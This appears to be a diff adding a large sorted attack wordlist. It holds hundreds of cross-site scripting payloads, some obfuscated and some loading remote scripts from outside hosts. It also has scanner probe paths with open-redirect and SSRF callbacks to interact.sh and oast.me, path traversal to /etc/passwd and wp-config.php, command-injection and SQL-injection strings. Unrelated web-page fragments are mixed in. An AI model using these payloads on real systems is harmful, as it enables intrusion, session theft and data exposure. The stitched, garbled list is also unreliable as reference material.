+&lt;a href="about:&lt;script&gt;document.vulnerable=true;&lt;/script&gt;"&gt;
+&lt;a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;"&gt;X&lt;/a&gt;
+&lt;a href="javascript#document.vulnerable=true;"&gt;
+&lt;a href=javascript&colon;alert&lpar;document&period;cookie&rpar;&gt;Click Here&lt;/a&gt;
+&lt;a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;"&gt;XYZ&lt;/a
+&lt;b&gt;
+&lt;base HREF="javascript:document.vulnerable=true;//"&gt;
+&lt;base href=//0&gt;
+&lt;bgsound SRC="javascript:document.vulnerable=true;"&gt;
+&lt;bgsound src="javascript:document.vulnerable=true;"&gt;
+&lt;bleh/onclick=top[/al/.source+/ert/.source]&Tab;``&gt;click
+&lt;body BACKGROUND="javascript:document.vulnerable=true;"&gt;
+&lt;body ONLOAD=document.vulnerable=true;&gt;
+&lt;body onload="document.vulnerable=true;"&gt;
+&lt;body style="background:gray"&gt;
+&lt;body&gt;
+&lt;body&gt;Hello&lt;/body&gt;
+&lt;br SIZE="&{document.vulnerable=true}"&gt;
+&lt;br&gt;
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;x id=x&gt;#x
+&lt;br&gt;&lt;x id=x&gt;#x
+&lt;br/&gt;&lt;hr/&gt;
+&lt;circle fill="red" r="40"&gt;&lt;/circle&gt;
+&lt;circle r="400"&gt;&lt;/circle&gt;
+&lt;details onauxclick=confirm`xss`&gt;&lt;/details&gt;
+&lt;div datafld="b" dataformatas="html" datasrc="#X"&gt;&lt;/div&gt;
+&lt;div id="113"&gt;&lt;div id="x"&gt;XXX&lt;/div&gt;
+&lt;div id="116"&gt;&lt;div id="x"&gt;x&lt;/div&gt;
+&lt;div id="117"&gt;&lt;a href="http://attacker.org"&gt;
+&lt;div id="120"&gt;&lt;script&gt;
+&lt;div id="123"&gt;&lt;span class=foo&gt;Some text&lt;/span&gt;
+&lt;div id="125"&gt;&lt;?xml version="1.0"?&gt;
+&lt;div id="129"&gt;&lt;svg&gt;
+&lt;div id="131"&gt;&lt;b&gt;drag and drop one of the following strings to the drop box:&lt;/b&gt;
+&lt;div id="134"&gt;&lt;xmp&gt;
+&lt;div id="135"&gt;&lt;?xml-stylesheet type="text/xsl" href="#" ?&gt;
+&lt;div id="136"&gt;&lt;form action="" method="post"&gt;
+&lt;div id="137"&gt;&lt;svg&gt;
+&lt;div id="43"&gt;&lt;?xml version="1.0" standalone="no"?&gt;
+&lt;div id="53"&gt;&lt;xml id="xss" src="test.htc"&gt;&lt;/xml&gt;
+&lt;div id="66"&gt;&lt;?xml version="1.0"?&gt;
+&lt;div id="91"&gt;[A]
+&lt;div id="99"&gt;XXX&lt;style&gt;
+&lt;div onmouseover="document.vulnerable=true;"&gt;
+&lt;div onmouseover='alert&lpar;1&rpar;'&gt;DIV&lt;/div&gt;
+&lt;div style="font-family:'foo&#10;;color:red;';"&gt;LOL
+&lt;div style="font-family:'foo&#10;;color:red;';"&gt;XXX
+&lt;div style="font-family:foo}color=red;"&gt;XXX
+&lt;div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&
+&lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;
+&lt;embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always&gt;?
+&lt;feImage&gt;
+&lt;form&gt;
+&lt;h1&gt;&lt;font color=blue&gt;hellox worldss&lt;/h1&gt;
+&lt;h1&gt;Drop me&lt;/h1&gt;
+&lt;head&gt;
+&lt;html:script&gt;
+&lt;iframe src="http://example.org/"&gt;&lt;/iframe&gt;
+&lt;iframe src="javascript:document.vulnerable=true; &lt;
+&lt;iframe src="vbscript:document.vulnerable=true;"&gt;
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+&lt;iframe src=http://ha.ckers.org/scriptlet.html &lt;
+&lt;iframe src=http://xss.rocks/scriptlet.html &lt;
+&lt;iframe src=javascript&colon;alert&lpar;document&period;location&rpar;&gt;
+&lt;iframe srcdoc=&lt;svg/o&#x6Eload&equals;alert&lpar;1)&gt;&gt;
+&lt;iframe srcdoc='&lt;body onload=prompt&lpar;1&rpar;&gt;'&gt;
+&lt;image filter='...'&gt;
+&lt;img DYNSRC="javascript:document.vulnerable=true;"&gt;
+&lt;img LOWSRC="javascript:document.vulnerable=true;"&gt;
+&lt;img SRC=" &#14; javascript:document.vulnerable=true;"&gt;
+&lt;img SRC="jav ascript:document.vulnerable=true;"&gt;
+&lt;img SRC="javascript:document.vulnerable=true;"
+&lt;img SRC="javascript:document.vulnerable=true;"&gt;
+&lt;img SRC='vbscript:document.vulnerable=true;'&gt;
+&lt;img dynsrc="javascript:document.vulnerable=true;"&gt;
+&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;
+&lt;img src="blah"onmouseover="document.vulnerable=true;"&gt;
+&lt;img src="blah&gt;" onmouseover="document.vulnerable=true;"&gt;
+&lt;img src="javascript:document.vulnerable=true;"&gt;
+&lt;img src="livescript:document.vulnerable=true;"&gt;
+&lt;img src="mocha:document.vulnerable=true;"&gt;
+&lt;img src=&{document.vulnerable=true;};&gt;
+&lt;img src=something onauxclick="new Function `al\ert\`xss\``"&gt;
+&lt;import namespace="t" implementation="#default#time2"&gt;
+&lt;input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;"&gt;
+&lt;input name="injected" value="injected" dirname="password" /&gt;
+&lt;input name="password" type="password" value="secret" /&gt;
+&lt;input name="secret" type="password"&gt;
+&lt;input name="username" value="admin" /&gt;
+&lt;input type="image" dynsrc="javascript:document.vulnerable=true;"&gt;
+&lt;input type="submit"&gt;
+&lt;input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+&lt;link REL="stylesheet" HREF="javascript:document.vulnerable=true;"&gt;
+&lt;link rel="stylesheet" href="javascript:document.vulnerable=true;"&gt;
+&lt;marquee onstart='javascript:alert&#x28;1&#x29;'&gt;^__^
+&lt;marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'&gt;
+&lt;math&gt;
+&lt;math&gt;&lt;a xlink:href="//jsfiddle.net/t846h/"&gt;click
+&lt;meta HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:document.vulnerable=true;"&gt;
+&lt;meta HTTP-EQUIV="refresh" CONTENT="0;url=javascript:document.vulnerable=true;"&gt;
+&lt;meta http-equiv="refresh" content="0;url=javascript:document.vulnerable=true;"&gt;
+&lt;object classid="clsid:..." codebase="javascript:document.vulnerable=true;"&gt;
+&lt;object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "&gt;&lt;/object&gt;
+&lt;root/&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;sCRIpt x="&gt;" src=//15.rs&gt;&lt;/script&gt;
+&lt;sCriPt/src=//14.rs?
+&lt;sVg&gt;&lt;scRipt &gt;alert&lpar;1&rpar; {Opera}
+&lt;script "a='&gt;'" SRC="http://www.securitycompass.com/xss.js"&gt;&lt;/script&gt;
+&lt;script &lt;B&gt;document.vulnerable=true;&lt;/script&gt;
+&lt;script ="&gt;" SRC="http://www.securitycompass.com/xss.js"&gt;&lt;/script&gt;
+&lt;script SRC="http://www.securitycompass.com/xss.jpg"&gt;&lt;/script&gt;
+&lt;script a="&gt;" '' SRC="http://www.securitycompass.com/xss.js"&gt;&lt;/script&gt;
+&lt;script a="&gt;" SRC="http://www.securitycompass.com/xss.js"&gt;&lt;/script&gt;
+&lt;script a="&gt;'&gt;" SRC="http://www.securitycompass.com/xss.js"&gt;&lt;/script&gt;
+&lt;script a=`&gt;` SRC="http://www.securitycompass.com/xss.js"&gt;&lt;/script&gt;
+&lt;script src="//brutelogic.com.br&sol;1.js&num;
+&lt;script src="http://code.jquery.com/jquery-1.4.4.js"&gt;&lt;/script&gt;
+&lt;script src=//brutelogic.com.br/1.js&gt;
+&lt;script src=http://yoursite.com/your_files.js&gt;&lt;/script&gt;
+&lt;script&gt;
+&lt;script&gt;a=/XSS/\ndocument.vulnerable=true;&lt;/script&gt;
+&lt;script&gt;d.innerHTML+='';&lt;/script&gt;
+&lt;script&gt;d.innerHTML+='';&lt;/script&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;script&gt;document.vulnerable=true;&lt;/script&gt;
+&lt;style TYPE="text/javascript"&gt;document.vulnerable=true;&lt;/style&gt;
+&lt;style type="text/css"&gt;
+&lt;style type="text/javascript"&gt;document.vulnerable=true;&lt;/style&gt;
+&lt;style&gt;
+&lt;style&gt;@im\port'\ja\vasc\ript:document.vulnerable=true';&lt;/style&gt;
+&lt;style&gt;@import'http://www.securitycompass.com/xss.css';&lt;/style&gt;
+&lt;style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+&lt;stylesheet xmlns="http://www.w3.org/TR/WD-xsl"&gt;
+&lt;svg contentScriptType=text/vbs&gt;&lt;script&gt;MsgBox+1
+&lt;svg onload=alert&#40;1&#41&gt;
+&lt;svg onload=alert&lpar;1&rpar;&gt;
+&lt;svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/&gt;
+&lt;svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/&gt;
+&lt;svg:svg&gt;
+&lt;table BACKGROUND="javascript:document.vulnerable=true;"&gt;
+&lt;table&gt;&lt;TD BACKGROUND="javascript:document.vulnerable=true;"&gt;
+&lt;template match="/"&gt;
+&lt;textarea type="text" cols="50" rows="10"&gt;&lt;/textarea&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+&lt;w="/x="y&gt;"/OndbLcLick=`&lt;`[confir\u006d``]&gt;z
+&lt;x &lt;/onxxx=1
+&lt;x 1="&gt;" onxxx=1
+&lt;x 1="1"onxxx=1
+&lt;x 1='1'onxxx=1
+&lt;x OnXxx=1
+&lt;x onxxx=1 onxxx=1
+&lt;x/onxxx=1
+&lt;xml src="javascript:document.vulnerable=true;"&gt;
+&lt;xml:namespace prefix="t"&gt;
+&lt;xsl:template match="/"&gt;
+&p=37
+&q=foobar&after=fizzbuzz
+&q=xss
+&sDNSLookup=ANY&fDNSLookup=davealger.info
+&utm_source=twitterfeed&utm_medium=twitter
+&v=s_78bk3dZcc
+&v=zTD4CYnm34c
+&{document.cookie=true;};
+&{document.vulnerable=true;};
+'
+' or 2=2
+'"&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;
+'">
+'">><marquee><h1>1</h1></marquee>
+'">><marquee><h1>XSS</h1></marquee>
+'&gt;"&gt;&lt;script src = 'http://www.site.com/XSS.js'&gt;&lt;/script&gt;
+'&gt;&gt;&lt;marquee&gt;&lt;h1&gt;XSS&lt;/h1&gt;&lt;/marquee&gt;
+''">
+')
+')>
+'+'';
+'-confirm`1`-'
+'-document.write`&lt;h1&gt;juniorEXPLOIT&lt;/h1&gt;`-'
+'-document.write`<h1>juniorEXPLOIT</h1>`-'
+';
+';onerror=alert;throw 1//
+'>
+'>"><script src = 'http://www.site.com/XSS.js'></script>
+'><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
+'><A CLASS=X></A>
+'><A HREF="//google">X</A>
+'><IMG ONERROR=�VBS:MSGBOX 1� SRC=A>
+'><IMG ONERROR=”VBS:MSGBOX 1” SRC=A>
+'><SCRIPT LANGUAGE=VBS>MSGBOX 1</SCRIPT>
+'><SCRIPT>a=/X/
+'><SPAN DATASRC="#X" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+'><a onmouseover="javascript:window.onerror=alert;throw 1>
+'><b/alt="1"onmouseover=InputBox+1language=vbs>X</b>
+'><body language=vbsonload=alert-1
+'><body onload="X">
+'><body/onload=javascript:window.onerror=eval;throw'=alert\x281\x29';
+'><br><br><b><u>X</u></b>
+'><div datafld="b" dataformatas="html" datasrc="#X"></div>
+'><div style="[a]color[b]:[c]red">XXX</div>
+'><div style="font-family:'foo[a];color:red;';">XXX</div>
+'><div style="font-family:foo}color=red;">X
+'><div style="font-family:foo}color=red;">XXX</div>
+'><embed/src=//goo.gl/nlX0P>
+'><h1>X</h1>
+'><iframe src=j&#x61;vasc&#x72ipt&#x3a;alert&#x28;1&#x29; >
+'><img language=�JScript.Encode� onerror=�#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@� src=a>
+'><img language=”JScript.Encode” onerror=”#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@” src=a>
+'><img onerror=MsgBox+1 language=vbs src=a>
+'><img onerror=�vbs:MsgBox 1� src=a>
+'><img onerror=”vbs:MsgBox 1” src=a>
+'><img src=x onerror="javascript:window.onerror=alert;throw 1">
+'><img/src="mars.png"alt="mars">
+'><marquee>Kerala Cyber Force</marquee>
+'><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
+'><object/data=//goo.gl/nlX0P>
+'><script language=vbs>MsgBox 1</script>
+'><style>*[{}@import'test.css?]{color: green;}</style>X
+'><svg><script>alert&#40 1&#41
+'><svg><script>alert&#40/1/&#41</script>
+'><svg><script>prompt&#40 1&#41</script>
+'>><marquee><h1>XSS</h1></marquee>
+)
+)/'-C<FEP=#X*
+*{color:red}&lt;/style&gt;//["'`--&gt;]]&gt;]&lt;/div&gt;
+*{color:red}</style>//["'`-->]]>]</div>
++/v+
++/v/
++/v8
++/v9
+- --&gt;&lt;a href=javascript:alert:document.domain
+- --><a href=javascript:alert:document.domain
+--&gt;
+--&gt;{}
+-->
+-->{}
+--tab-size-preference: 4;
+-1&<script>document.cookie=true;</script>
+-1&{document.cookie=true;};
+-1</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
+-1<<script>document.cookie=true;</script>
+-1<BASE HREF="javascript:document.cookie=true;//">
+-1<BGSOUND SRC="javascript:document.cookie=true;">
+-1<BODY BACKGROUND="javascript:document.cookie=true;">
+-1<BODY ONLOAD=document.cookie=true;>
+-1<BR SIZE="&{document.cookie=true}">
+-1<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
+-1<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
+-1<IMG DYNSRC="javascript:document.cookie=true;">
+-1<IMG LOWSRC="javascript:document.cookie=true;">
+-1<IMG SRC="  javascript:document.cookie=true;">
+-1<IMG SRC="jav ascript:document.cookie=true;">
+-1<IMG SRC="javascript:document.cookie=true;">
+-1<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
+-1<LAYER SRC="javascript:document.cookie=true;"></LAYER>
+-1<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
+-1<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
+-1<SCRIPT <B>document.cookie=true;</SCRIPT>
+-1<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>
+-1<SCRIPT>document.cookie=true;//<</SCRIPT>
+-1<SCRIPT>document.cookie=true;</SCRIPT>
+-1<STYLE TYPE="text/javascript">document.cookie=true;</STYLE>
+-1<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
+-1<TABLE BACKGROUND="javascript:document.cookie=true;">
+-1<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
+-1<a href="about:<script>document.cookie=true;</script>">
+-1<a href="javascript#document.cookie=true;">
+-1<bgsound src="javascript:document.cookie=true;">
+-1<body onload="document.cookie=true;">
+-1<div onmouseover="document.cookie=true;">
+-1<iframe src="javascript:document.cookie=true;>
+-1<img dynsrc="javascript:document.cookie=true;">
+-1<img src="blah"onmouseover="document.cookie=true;">
+-1<img src="blah>" onmouseover="document.cookie=true;">
+-1<img src="javascript:document.cookie=true;">
+-1<img src="livescript:document.cookie=true;">
+-1<img src="mocha:document.cookie=true;">
+-1<img src=&{document.cookie=true;};>
+-1<input type="image" dynsrc="javascript:document.cookie=true;">
+-1<link rel="stylesheet" href="javascript:document.cookie=true;">
+-1<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
+-1<object classid="clsid:..." codebase="javascript:document.cookie=true;">
+-1<script>document.cookie=true;//--></script>
+-1<style type="text/javascript">document.cookie=true;</style>
+-1<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
+-1<xml src="javascript:document.cookie=true;">
+-1¼script¾document.cookie=true;¼/script¾
+.
+.source a+=/al/
+.source a+=/al///
+/
+/'>
+/* INJECTX
+/* Override primer focus outline color for marketing header dropdown links for better contrast */
+//
+// INJECTX
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+//<form/action=javascript&#x3A;confirm&lpar;document&period;cookie&rpar;><input/type='submit'>//
+//{{string}}
+/111/rs:fit:400:400:0:0/plain/http://{{interactsh-url}}
+/3/ucenter_api/code/register_nodb.php/
+/><input>
+/?admin
+/?aiowpsec_do_log_out=1&after_logout=https://interact.sh
+/?aiowpsec_do_log_out=1&al_additional_data=1
+/?gf_page=randomstring
+/?noptin_ns=email_click&to=https://interact.sh
+/?static=1&order=asc
+/?travelpayouts_redirect=https://oast.me
+/?url=<img/src=
+/?wprm_print={{recipe_id}}
+/?wptouch_switch=desktop&redirect=http://interact.sh
+/?{{xss_param}}
+/CFIDE/scripts/ajax/package/cfajax.js
+/CF_SFSD/scripts/ajax/package/cfajax.js
+/Citrix/teststoreAuth/SamlTest
+/CuteSoft_Client/CuteEditor/Template.aspx?Referrer=XSS
+/Help.aspx?helpkey=xxxxxxx
+/Images/Remote?imageUrl=https://oast.me/
+/Items/RemoteSearch/Image?ImageUrl=https://oast.me/&ProviderName=TheMovieDB
+/MicroStrategyWS/happyaxis.jsp
+/Runtime/Data/ms_admin.php
+/WEB-INF/web.xml
+/__nuxt_vite_node__/module//bin/passwd
+/__nuxt_vite_node__/module/C:/Windows/System32/calc.exe
+/_bulk
+/_nuxt/@fs/etc/passwd
+/_nuxt/@fs/windows/win.ini
+/academy/tutor/filter?searched_word=acoa5\
+/admin
+/admin/data/autosuggest-remote.php?q=
+/ads/www/delivery/lg.php?dest=http://interact.sh
+/adserve/www/delivery/lg.php?dest=http://interact.sh
+/adserver/www/delivery/lg.php?dest=http://interact.sh
+/ajax-api/2.0/mlflow-artifacts/artifacts?path=C:/
+/ajax/telemetry.php
+/alert`2`/i
+/api/image/cover-upload?filename=../appsettings.json
+/api/index.php/v1/config/application?public=true
+/api/logout?redirect_to=http://oast.pro/
+/api/users/search_authors
+/api/v1/config/application?public=true
+/api/v1/terminal/sessions/
+/api/v1/version
+/assets/_core/php/profile.php
+/assets/php/profile.php
+/asyncrenderer/{{url}}?clientId={{id}}&timeout=500&wiki=xwiki
+/auth/failure?provider={{basic_xss}}
+/auth/failure?provider={{redirect_payload}}
+/auth/logout?continue=//interact.sh
+/auth/realms/master/clients-registrations/default
+/auth/realms/master/clients-registrations/openid-connect
+/backend
+/badging/badge_template_v0.php?layout=1&type=
+/bin/login/XWiki/XWikiLogin?xredirect=//oast.me
+/bin/login/XWiki/XWikiLogin?xredirect=//www.oast.me
+/bin/login/XWiki/XWikiLogin?xredirect=http:/www.oast.me
+/bin/login/XWikiLogin?xpage=uorgsuggest&uorg=user&wiki=&media=json
+/blog/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+/blog/wp-content/uploads/ao_ccss/queuelog.html
+/boafrm/formWlanRedirect?redirect-url=http://interact.sh&wlan_id=1
+/calendar/calendar_form.php/
+/cas/logout?url=https://oast.pro
+/ccm/system/panels/page/preview_as_user/preview?cID=
+/cf-scripts/scripts/ajax/package/cfajax.js
+/cf_scripts/scripts/ajax/package/cfajax.js
+/cfide-scripts/ajax/package/cfajax.js
+/cfide/scripts/ajax/package/cfajax.js
+/cfmx/CFIDE/scripts/ajax/package/cfajax.js
+/classifieds
+/community/?foro=signin&redirect_to=https://interact.sh/
+/data/autosuggest-remote.php?q=
+/data/model/custom_model_path/recruit.filelist.txt
+/default.aspx?years=http://oast.pro
+/displays/nuclei_check.json
+/does_not_exist
+/embed.js
+/error3?msg=30&data=
+/faqs
+/file=https://oast.pro
+/find-a-matchpksyk
+/flatpress/fp-content/
+/fp-content/
+/free_time.cgi
+/functions/scripts/find_full_subnets.php
+/ghost/preview
+/glpi/ajax/telemetry.php
+/goforms/rlminfo
+/gsearch.php.en?prod=
+/home/courses?query=
+/hoteldruid/inizio.php
+/hoteldruid/visualizza_tabelle.php?nsextt=x
+/htaccess.txt
+/http_header.php
+/i18n/component/JS?locale=en-US
+/ilias/shib_logout.php?action=logout&return=https://oast.me
+/index.hsp?m=
+/index.hsp?passwordExpired=yes&domainName=\\
+/index.hsp?passwordExpired=yes&username=\\
+/index.html
+/index.jsp
+/index.php/interact.sh
+/index.php/test
+/index.php?SQ=0&srch=x
+/index.php?action=login.index
+/index.php?m=user&c=Users&a=logout&referurl=https://interact.sh
+/index.php?rest_route=/whm/v3/themesettings
+/index.php?showmessage=4&customermail=\
+/info.php?RESULT=\
+/inizio.php
+/jobs/?\
+/js/zimbraMail/share/model/ZmSettings.js
+/jsps/genrequest.jsp?routineName=
+/karma.js
+/kindeditor/php/demo.php
+/login.php/
+/login.php?secret=
+/login?next=\\\interact.sh
+/loginLess/../../etc/passwd
+/loginsave.php?u=http://interact.sh
+/main/calendar/agenda_list.php?type=xss
+/messages
+/mobile/index.php
+/modules/mod_jvtwitter/jvtwitter.php?id=
+/new/newhttp://interact.sh
+/novius-os/admin/nos/login?redirect=http://interact.sh
+/o/get/resource?url=https://{{interactsh-url}}
+/omni_success?cmdb_edit_path=\
+/openx/www/delivery/lg.php?dest=http://interact.sh
+/otobo/index.pl?Action=ExternalURLJump;URL=http://www.interact.sh
+/passwordreset?bundle=
+/php/demo.php
+/php/ping.php?hostname=|dir
+/phpldapadmin/
+/phpwiki/index.php/passwd
+/pme/database/pme/phinx.yml
+/project/switch/1?targetPath=http://oast.pro
+/queues
+/realms/master/clients-registrations/default
+/realms/master/clients-registrations/openid-connect
+/register/?redirect_to=https://interact.sh/
+/remotereporter/load_logfiles.php?server=127.0.0.1&url=https://interact.sh/
+/reset-password/?selector=test
+/resource/md/get/url?url=http://oast.pro
+/revive/www/delivery/lg.php?dest=http://interact.sh
+/robots.txt
+/s/{{randstr}}/_/;/WEB-INF/web.xml
+/scgi-bin/platform.cgi?page=portalLogin.htm&portal=SSLVPN
+/search/index?q=
+/search?filter[brandid]=vnxjb
+/self.key
+/server-common/cgi-bin/login
+/services/
+/setup
+/setup.php
+/shib_logout.php?action=logout&return=https://oast.me
+/sidekiq
+/signin?from=https://interact.sh
+/solr/admin/metrics
+/ssoAdapter/logoutAction.do?servProvCode=SAFVC&successURL=https://interact.sh/
+/steve/services/
+/stores
+/templates/pages/debug_panel.php?id={{randstr}}
+/themes
+/topic/e
+/user_info
+/users/viewi1omd
+/vendor/phpfastcache/phpfastcache/docs/examples/phpinfo.php
+/vendor/phpfastcache/phpfastcache/examples/phpinfo.php
+/vendor/qcubed/qcubed/assets/php/profile.php
+/wa.exe?REPORT&z=4&
+/webadmin/clientlogin/?srid=&action=showdeny&url=
+/webapps/xwiki/WEB-INF/xwiki.properties
+/webmail/?color=
+/wp-admin/admin-ajax.php
+/wp-admin/admin-ajax.php?action=bwg_frontend_data&shortcode_id=1
+/wp-admin/admin-ajax.php?action=cdaily&subaction=cd_calendar&id=XX
+/wp-admin/admin-ajax.php?action=directorist_author_pagination
+/wp-admin/admin-ajax.php?action=eventon_get_virtual_users
+/wp-admin/admin-ajax.php?action=eventon_ics_download&event_id=1
+/wp-admin/admin-ajax.php?action=kc_get_thumbn&id=https://interact.sh
+/wp-admin/admin-ajax.php?action=post_grid_ajax_search_free
+/wp-admin/admin-ajax.php?action=post_grid_paginate_ajax_free
+/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+/wp-admin/admin-ajax.php?action=shareaholic_debug_info
+/wp-admin/admin-ajax.php?page=social-metrics-tracker-export&smt_download_export_file=1
+/wp-admin/admin-post.php
+/wp-admin/admin.php
+/wp-admin/admin.php/
+/wp-admin/admin.php?page=rsvp-admin-export
+/wp-admin/admin.php?page=wc-settings&action=redirect_telcell_form&api_url=https://oast.me
+/wp-admin/admin.php?page=wp_ajax_rsvp-form&tribe_tickets_redirect_to=https://interact.sh
+/wp-admin/options-general.php?page=cf7sr_edit&
+/wp-admin?piereg_logout_url=true&redirect_to=https://oast.me
+/wp-content/backups-dup-lite
+/wp-content/backups-dup-lite/dup-installer/main.installer.php?view=1
+/wp-content/backups-dup-lite/tmp/
+/wp-content/bps-backup/logs/db_backup_log.txt
+/wp-content/debug.log
+/wp-content/ewww/debug.log
+/wp-content/plugins/1-click-migration/ocm_debug.log
+/wp-content/plugins/all-in-one-wp-migration/readme.txt
+/wp-content/plugins/all-in-one-wp-migration/storage/error.log
+/wp-content/plugins/bulletproof-security/admin/htaccess/db_backup_log.txt
+/wp-content/plugins/cmp-coming-soon-maintenance/readme.txt
+/wp-content/plugins/easy-wp-smtp/logs/
+/wp-content/plugins/elementor/assets/js/frontend.min.js
+/wp-content/plugins/elementor/readme.txt
+/wp-content/plugins/gtranslate/url_addon/gtranslate.php?glang=en&gurl=/oast.me
+/wp-content/plugins/insert-php/readme.txt
+/wp-content/plugins/jh-404-logger/readme.txt
+/wp-content/plugins/protect-wp-admin/readme.txt
+/wp-content/plugins/qards/html2canvasproxy.php?url=https://{{interactsh-url}}
+/wp-content/plugins/quttera-web-malware-scanner/quttera_wp_report.txt
+/wp-content/plugins/site-offline/readme.txt
+/wp-content/plugins/user-meta/readme.txt
+/wp-content/plugins/user-meta/views/debug.php
+/wp-content/plugins/wordpress-toolbar/toolbar.php?wptbto=https://oast.me&wptbhash=acme
+/wp-content/plugins/wp-easycart/inc/admin/phpinfo.php
+/wp-content/plugins/wp-retina-2x/classes/wp-retina-2x.log
+/wp-content/themes/Grimag/go.php?https://interact.sh
+/wp-content/themes/Upward/go.php?https://interact.sh
+/wp-content/themes/bello/readme.txt
+/wp-content/tmp/db/{{table}}.sql
+/wp-content/uploads/EnableMediaReplace.log
+/wp-content/uploads/ao_ccss/queuelog.html
+/wp-content/uploads/download-manager-files/
+/wp-content/uploads/fifu-cloud.log
+/wp-content/uploads/fifu-plugin.log
+/wp-content/uploads/fusion-forms/
+/wp-content/uploads/wp-retina-2x-logs.txt
+/wp-content/uploads/wp-retina-2x.log
+/wp-content/uploads/wp-statistics/debug.log
+/wp-content/uploads/wpdesk-logs/wpdesk_debug.log
+/wp-content/wflogs/config-synced.php
+/wp-content/wflogs/config.php
+/wp-json
+/wp-json/guppy/v2/load-guppy-users?userId=1&offset=0&search=
+/wp-json/ldlms/v1/sfwd-quiz
+/wp-json/learnpress/v1/users
+/wp-json/lp/v1/orders/statistic
+/wp-json/ssa/v1/users
+/wp-json/tribe/events/v1/events/
+/wp-json/tribe/events/v1/organizers
+/wp-json/tribe/events/v1/venues
+/wp-json/visualizer/v1/upload-data
+/wp-json/wp/v2/asked-question
+/wp-json/wp/v2/posts
+/wp-json/wp/v2/posts?per_page=1
+/wp-json/wp/v2/sensei-messages/{{num}}
+/wp-json/wp/v2/sfwd-assignment
+/wp-json/wp/v2/sfwd-question
+/wp-json/wp/v2/users
+/wp-json/wp/v2/users?foo=simple-jwt-login
+/wp-json/wp/v2/wprm_recipe?per_page=5
+/wp-json?
+/wp-login.php?action=lostpassword&error=invalidkey
+/www/delivery/lg.php?dest=http://interact.sh
+/xwiki/
+/xwiki/bin/login/XWikiLogin?xpage=uorgsuggest&uorg=user&wiki=&media=json
+/zabbix/setup.php
+/zabbix/zabbix.php?action=dashboard.list
+/{{path}}
+/{{randstr}}
+/{{route}}search=@
+/{{string}}
+0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=
+1
+1'"&gt;&lt;img/src/onerror=.1|alert``&gt;
+1'"><img/src/onerror=.1|alert``>
+1script3document.vulnerable=true;1/script3
+404: Not Found
+5NcnM3bBXf
+:
+:root {
+;
+;onerror=confirm;throw 1;
+<
+<  script > < / script>
+< script >
+<""/title>
+<"<i<d<=<x< c<o<n<t<e<n<t<e<d<i<t<a<b<l<e</<
+<"<o<n<b<l<u<r<=<&apos;<`
+<+script+>
+</BODY></HTML>
+</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+</HTML>
+</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
+</TITLE><object/data=https://finickycold.htmlpasta.com>
+</a>
+</a>//["'`-->]]>]</div>
+</a></li>
+</auto-check>
+</b>
+</body>
+</button>
+</clipboard-copy>
+</cookie-consent-link>
+</custom-scopes>
+</details-dialog>
+</details>
+</dialog></dialog-helper>
+</div>
+</div>    </div>
+</div></div>            </div>
+</doc>//["'`-->]]>]</div>
+</experimental-action-menu>  </locale-selector>
+</feImage>
+</footer>
+</form>
+</form>        </div>
+</form>  <webauthn-status class="js-webauthn-login-emu-control">
+</form>//["'`-->]]>]</div>
+</form></div>
+</h1>
+</h3>
+</h4>
+</head>
+</header>
+</html:html>
+</html:script>
+</html>
+</html>//["'`-->]]>]</div>
+</image>
+</label>
+</li>
+</main>
+</math>//["'`-->]]>]</div>
+</modal-dialog></div>
+</nav>
+</p>
+</pre>
+</qbsearch-input>
+</query-builder></form>
+</react-partial-anchor>
+</react-partial>
+</script>
+</script>     <script>[class extends[alert``]{}]</script>
+</script>//["'`-->]]>]</div>
+</script><svg '//"
+</scrollable-region>
+</section>
+</span>
